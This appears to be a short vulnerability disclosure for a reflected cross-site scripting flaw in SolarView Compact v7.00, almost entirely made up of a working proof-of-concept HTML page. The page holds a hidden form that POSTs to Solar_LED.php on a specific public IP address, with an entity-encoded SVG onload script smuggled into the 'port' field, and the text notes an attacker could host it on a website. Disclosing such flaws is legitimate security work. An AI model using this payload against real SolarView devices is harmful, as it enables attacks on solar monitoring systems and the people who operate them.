# Description:
Cross-site Scripting (XSS) - Reflected in SolarView Compact v7.00 Via crafted POST Request

## POC:

When someone opens this html file, or if attacker add it into his website, XSS will execute at the targeted vulnerable SolarView Compact host

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://124.85.103.237/Solar_LED.php" method="POST">
      <input type="hidden" name="led&#95;id&#91;&#93;" value="&#58;11" />
      <input type="hidden" name="led&#95;digits&#91;&#93;" value="1" />
      <input type="hidden" name="led&#95;id&#91;&#93;" value="&#58;11" />
      <input type="hidden" name="led&#95;digits&#91;&#93;" value="1" />
      <input type="hidden" name="led&#95;id&#91;&#93;" value="&#58;11" />
      <input type="hidden" name="led&#95;digits&#91;&#93;" value="1" />
      <input type="hidden" name="led&#95;id&#91;&#93;" value="&#58;11" />
      <input type="hidden" name="led&#95;digits&#91;&#93;" value="1" />
      <input type="hidden" name="port" value="batman&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS_By_Strik3r&apos;&#41;&gt;" />
      <input type="hidden" name="btnSave" value="&#149;Û&#145;&#182;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

![image](https://user-images.githubusercontent.com/94288990/198833923-86f3cd74-e7f6-45b2-bb82-41ac4d476e09.png)
